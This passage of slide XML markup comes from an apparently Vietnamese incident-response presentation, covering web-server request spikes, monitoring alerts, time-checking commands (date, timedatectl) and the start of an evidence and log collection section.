                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>+ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Lượng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>yêu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>cầu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> (Requests) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>tới</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> Web Server </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>tăng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>đột</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>biến</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="365" name="Google Shape;365;p35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6962775" y="4373112"/>
            <a:ext cx="4257600"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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>+ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Hệ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>thống</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>giám</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>sát</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>văng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>nhiều</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>cảnh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>báo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>truy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>cập</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>sai</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>kịch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>bản</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="366" name="Google Shape;366;p35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="971550" y="3176587"/>
            <a:ext cx="857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0B981"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>▹</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="367" name="Google Shape;367;p35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="971550" y="3938587"/>
            <a:ext cx="85800" cy="215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endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="368" name="Google Shape;368;p35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="971550" y="4386262"/>
            <a:ext cx="85800" cy="215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endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="369" name="Google Shape;369;p35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6677025" y="3176587"/>
            <a:ext cx="857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0B981"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>▹</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="370" name="Google Shape;370;p35"/>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VI. Thực nghiệm: </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="371" name="Google Shape;371;p35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="1143000"/>
            <a:ext cx="11029950" cy="1905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2" name="Google Shape;372;p35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="679775" y="1198387"/>
            <a:ext cx="5908200" cy="51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US" sz="2400" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>6.1. Phát Hiện Sự Cố </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>(Triggers):</a:t>
            </a:r>
            <a:endParaRPr sz="24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76"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="377" name="Google Shape;377;p36" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="1500175"/>
            <a:ext cx="10791825" cy="4449775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="378" name="Google Shape;378;p36"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1352550" y="1633525"/>
            <a:ext cx="32193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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Xác định thời gian: </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="379" name="Google Shape;379;p36"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1009650" y="2124787"/>
            <a:ext cx="2895600" cy="96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a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>-  Câu lệnh:</a:t>
            </a:r>
            <a:endParaRPr sz="1500">
              <a:solidFill>
                <a:srgbClr val="CBD5E1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="160000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>	date</a:t>
            </a:r>
            <a:endParaRPr sz="1500">
              <a:solidFill>
                <a:srgbClr val="CBD5E1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="160000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>	timedatectl</a:t>
            </a:r>
            <a:endParaRPr sz="1500">
              <a:solidFill>
                <a:srgbClr val="CBD5E1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="380" name="Google Shape;380;p36" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="876300" y="1604962"/>
            <a:ext cx="285750" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="381" name="Google Shape;381;p36"/>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6.2. Thu thập và bảo toàn chứng cứ: </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="382" name="Google Shape;382;p36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="1143000"/>
            <a:ext cx="11029950" cy="1905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83" name="Google Shape;383;p36"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect t="-23080" b="12595"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2162175" y="2695575"/>
            <a:ext cx="7629525" cy="30071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87"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="388" name="Google Shape;388;p37" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="1568450"/>
            <a:ext cx="10791825" cy="4724400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="389" name="Google Shape;389;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1433138" y="1824025"/>
            <a:ext cx="28956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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Thu thập log: </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
